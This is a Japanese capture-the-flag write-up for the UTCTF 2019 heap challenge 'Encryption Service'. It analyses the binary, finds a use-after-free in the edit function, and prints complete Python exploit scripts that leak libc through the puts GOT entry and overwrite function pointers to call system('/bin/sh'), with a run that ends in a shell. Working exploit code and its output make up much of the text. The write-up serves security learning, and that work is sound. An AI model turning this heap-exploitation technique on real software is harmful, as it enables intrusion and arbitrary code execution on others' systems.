# [pwn 1200pts] Encryption Service - UTCTF
64ビットバイナリです．久しぶりにlibc(libc-2.23.so)も配布されています．
libc-2.26より前はtcacheがないので注意です．
```
$ checksec pwnable
[*] '/home/ptr/writeups/2019/UTCTF_2019/encryption_service/pwnable'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
IDAで解析しましょう．

まずユーザーIDをscanfで入力してグローバル変数`user_id`に入れます．
そこからメニューがあり，次の4つの機能が使えます．

1. Encrypt message
2. Remove Encrypted Message
3. View Encrypted Message
4. Edit Encrypted Message

まず`encryption_string`を見てみましょう．
この中にも2つメニューがあり，OTPとXORを選ぶことができます．
最初に呼ばれる`create_info`では，グローバル変数informationから空いているものを選び，そこにサイズ0x28だけmallocします．
そしてその構造体(`st_encrypt`と呼ぶ)の先頭から0x20バイト目の4バイトを0にし，確保したアドレスを返します．
さらに返ってきたアドレスは別の構造体に入れられます．(`st_message`と呼ぶ)
`st_encrypt`には暗号化に使われる関数や機能出力用の関数などのポインタが入ります．
暗号化するメッセージのサイズも聞かれるのですが，インクリメントされて`st_encrypt`の方にも格納されます．

```
struct typedef {
    char *msg;
    char *encmsg;
    void *func_encrypt;
    void *func_print;
    int deleted;
    int size_inc;
} st_encrypt;

struct typedef {
    int size;
    st_encrypt *data;
} st_message;
```

次に`size`バイトだけmallocされて，メッセージをfgetsで`size`バイト入力できます．
さらに暗号化されたメッセージが入る`encmsg`が`size`バイトだけmallocされます．
最後に`st_encrypt`の`func_encrypt(msg, encmsg)`が呼び出されます．

次に`remove_encrypted_string`関数を見ます．
インデックスを入力し，確保済み(information[index]!=NULL && deleted==0)であれば次の処理をします．
```
data->deleted = 1;
free(data->msg);
free(data->encmsg);
```

次に`view_messages`関数を解析します．
この関数ではinformationがNULLでなく，かつ`data->deleted`が0の場合にmsgおよびencmsgを表示します．

最後に`edit_encrypted_message`関数を見てみましょう．
まずインデックスを入力し，informationがNULLでなければ新しいメッセージを`size_inc`バイトだけ入力でき，`func_encrypt(msg, encmsg)`が呼び出されます．

~~うーん，ぱっと見で発見できる脆弱性は`edit_encrypted_message`のoff-by-oneでしょうか．
この間overlapの問題を自作して試したところなので腕試しになりますね．
off-by-oneで次のチャンクのサイズを書き換え，次のチャンクをfreeした後に変更後のサイズでmallocすれば，次の次のチャンクが上書きできます．~~
※後で分かったのですがoff-by-onじゃなくて単にUAFでした．

この問題で何日も止まってるのでwriteup見ます．

はい．editでdeletedをチェックしていないのでUAFがあるというオチでした．
でもlibcのバージョン古いからtcache poisoningが使えない上libcのアドレスがリークできていないです．
しかしfreeしたチャンクが編集できるので，大きなチャンクをfreeして`st_encrypt`として使わせた状態で編集すれば各種ポインタがいじれるのですね．
言われてみれば単純です．

ただし問題があって，普通削除後に作成すると，削除したindexが使われるのでメッセージを編集できません．
これを解決する方法は2つあって，~~削除するindexよりも小さいindexのメッセージを先に削除しておく方法と~~，不正な暗号化オプションのメッセージを作る方法です．（参考文献[2]）
※後で分かったのですが，informationは新規作成じゃないとmallocされないので前者の方法は使えません．

サイズ制限がある場合でも対応できるよう，今回は前者の手法を使います．

ではmallocとfreeの順番を考えてみましょう．
例えばサイズ0x28のメッセージを削除した状態では
```
smallbins[for 0x28] --> (d1->encmsg) --> (d1->msg)
```
となります．
~~この状態で新しいメッセージを作ると構造体用の`malloc(0x28)`は`d1->encmsg`となります．
`d1->encmsg`は`d1->msg`の暗号化されたデータなので，適当に`d1->msg`をeditすれば任意の状態に変更できます．~~
※後でバイナリを読み直したら違いました．

XORは`user_id`を鍵とするので`user_id`として0を指定しておけば`d1->msg`がそのまま`d1->encmsg`になります．

実際にindexが0と1の2つを削除し，0に確保された後のメモリの状態を確認します．
```
gdb-peda$ x/32wx 0x018be010
0x18be010:      0x018be100      0x00000000      0x018be0d0      0x00000000
0x18be020:      0x0040093c      0x00000000      0x00400887      0x00000000
0x18be030:      0x00000000      0x00000028      0x00000031      0x00000000
0x18be040:      0x00000000      0x00000000      0x00000000      0x00000000
0x18be050:      0x00000000      0x00000000      0x00000000      0x00000000
0x18be060:      0x00000000      0x00000000      0x00000031      0x00000000
0x18be070:      0x018be030      0x00000000      0x00000000      0x00000000
0x18be080:      0x00000000      0x00000000      0x00000000      0x00000000
gdb-peda$ x/32wx 0x018be0a0
0x18be0a0:      0x018be0d0      0x00000000      0x018be100      0x00000000
0x18be0b0:      0x0040093c      0x00000000      0x00400887      0x00000000
0x18be0c0:      0x00000001      0x00000028      0x00000031      0x00000000
0x18be0d0:      0x01000a43      0x00000000      0x00000000      0x00000000
0x18be0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x18be0f0:      0x00000000      0x00000000      0x00000031      0x00000000
0x18be100:      0x01000a43      0x00000000      0x00000000      0x00000000
0x18be110:      0x00000000      0x00000000      0x00000000      0x00000000
```

んー，`st_encrypt`用のmallocがされていない...？

`create_info`関数を読み直したら，information[i]がNULLのときだけmallocしています．
だから削除時に`st_encrypt`はfreeしなかったんですね．

ということで別の方法でいきましょう．
メッセージの暗号化オプションを聞かれたときに不正なオプションを答えると何もせずに終了します．
したがって，`create_info`の0x28バイトがmallocされるだけで終了するのです．
これはinformationを消費してくれるので便利です．

informationを消費してmsgやencmsgのポインタを変えないので，今度こそ`st_encrypt`の内容を上書きできます．

まずはputsのGOTアドレスからlibcのアドレスをリークしましょう．
```python
from ptrlib import *

def encrypt_message(mode, size, message):
    sock.recvuntil(">")
    sock.sendline("1")
    sock.recvuntil(">")
    sock.sendline(str(mode))
    if 1 <= mode <= 2:
        sock.recvuntil(">")
        sock.sendline(str(size))
        sock.recvuntil("message: ")
        sock.sendline(message)
        sock.recvuntil("message is: ")
        return sock.recvline().rstrip()
    else:
        return None

def remove_encrypted_message(index):
    sock.recvuntil(">")
    sock.sendline("2")
    sock.recvuntil("remove: ")
    sock.sendline(str(index))

def view_encrypted_message(index):
    sock.recvuntil(">")
    sock.sendline("3")
    sock.recvuntil("Message #" + str(index) + "\n")
    sock.recvuntil("Plaintext: ")
    plaintext = sock.recvline().rstrip()
    sock.recvuntil("Ciphertext: ")
    ciphertext = sock.recvline().rstrip()
    return plaintext, ciphertext

def edit_encrypted_message(index, message):
    sock.recvuntil(">")
    sock.sendline("4")
    sock.recvuntil("edit\n")
    sock.sendline(str(index))
    sock.recvuntil("message\n")
    sock.sendline(message)

elf = ELF("./pwnable")
plt_puts = 0x004006e0
libc = ELF("./libc-2.17.so")
sock = Socket("127.0.0.1", 9001)
_ = input()

sock.recvline()
sock.sendline("0")

# libc leak
payload = b''
payload += p64(elf.got("puts"))
payload += p64(elf.got("puts"))
payload += p64(plt_puts)
payload += p64(plt_puts)
payload += p64(0)

encrypt_message(2, 0x200, "A") # 0
remove_encrypted_message(0)
encrypt_message(3, 0, '') # 0
encrypt_message(3, 0, '') # 1

edit_encrypted_message(0, payload)

edit_encrypted_message(1, '')
addr_puts = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
dump("libc_base = " + hex(libc_base))

sock.interactive()
```

やっとできそうです．
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:9001

[ptrlib] libc_base = 0x7fd16230c000
[ptrlib]$ Welcome to Encryption as a Service!
 What would you like to do?
1. Encrypt message
2. Remove Encrypted Message
3. View Encrypted Message
4. Edit Encrypted Message
5. Exit
>
```

あとは`puts(puts@got)`の代わりに`system("/bin/sh")`を呼び出すだけの簡単なお仕事．
```python
from ptrlib import *

def encrypt_message(mode, size, message):
    sock.recvuntil(">")
    sock.sendline("1")
    sock.recvuntil(">")
    sock.sendline(str(mode))
    if 1 <= mode <= 2:
        sock.recvuntil(">")
        sock.sendline(str(size))
        sock.recvuntil("message: ")
        sock.sendline(message)
        sock.recvuntil("message is: ")
        return sock.recvline().rstrip()
    else:
        return None

def remove_encrypted_message(index):
    sock.recvuntil(">")
    sock.sendline("2")
    sock.recvuntil("remove: ")
    sock.sendline(str(index))

def view_encrypted_message(index):
    sock.recvuntil(">")
    sock.sendline("3")
    sock.recvuntil("Message #" + str(index) + "\n")
    sock.recvuntil("Plaintext: ")
    plaintext = sock.recvline().rstrip()
    sock.recvuntil("Ciphertext: ")
    ciphertext = sock.recvline().rstrip()
    return plaintext, ciphertext

def edit_encrypted_message(index, message):
    sock.recvuntil(">")
    sock.sendline("4")
    sock.recvuntil("edit\n")
    sock.sendline(str(index))
    sock.recvuntil("message\n")
    sock.sendline(message)

elf = ELF("./pwnable")
plt_puts = 0x004006e0
libc = ELF("./libc-2.17.so")
sock = Socket("127.0.0.1", 9001)
_ = input()

sock.recvline()
sock.sendline("0")

# libc leak
payload = b''
payload += p64(elf.got("puts"))
payload += p64(elf.got("puts"))
payload += p64(plt_puts)
payload += p64(plt_puts)
payload += p64(0)

encrypt_message(2, 0x200, "A") # 0
remove_encrypted_message(0)
encrypt_message(3, 0, '') # 0
encrypt_message(3, 0, '') # 1

edit_encrypted_message(0, payload)

edit_encrypted_message(1, '')
addr_puts = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.search("/bin/sh"))
dump("libc_base = " + hex(libc_base))

# get the shell!
payload = b''
payload += p64(addr_binsh)
payload += p64(addr_binsh)
payload += p64(addr_system)
payload += p64(addr_system)
payload += p64(0)
edit_encrypted_message(0, payload)

edit_encrypted_message(1, '')

sock.interactive()
```

やっとできました！
```
$ python solve.py
[+] Socket: Successfully connected to 127.0.0.1:9001

[ptrlib] libc_base = 0x7f0c4da45000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),10(wheel),982(docker)
[ptrlib]$
```

# 感想
ところどころ普通のヒープ問と違う点があったので凄い詰まりました．
気付けば簡単なんだろうけどちゃんとバイナリを読まないから解けないんです．
やっぱり時間かかるけど読みながらCソースに直した方がいいのかな．
細部までバイナリを読む癖をつけないとダメですね．
このレベルの問題はさくっと解けるようになりたいです．

# 参考文献
[1] [https://github.com/poortho/ctf-writeups/tree/master/2019/utctf/encryption_service](https://github.com/poortho/ctf-writeups/tree/master/2019/utctf/encryption_service)
[2] [https://github.com/merrychap/ctf-writeups/tree/master/2019/UTCTF/Encryption%20Service](https://github.com/merrychap/ctf-writeups/tree/master/2019/UTCTF/Encryption%20Service)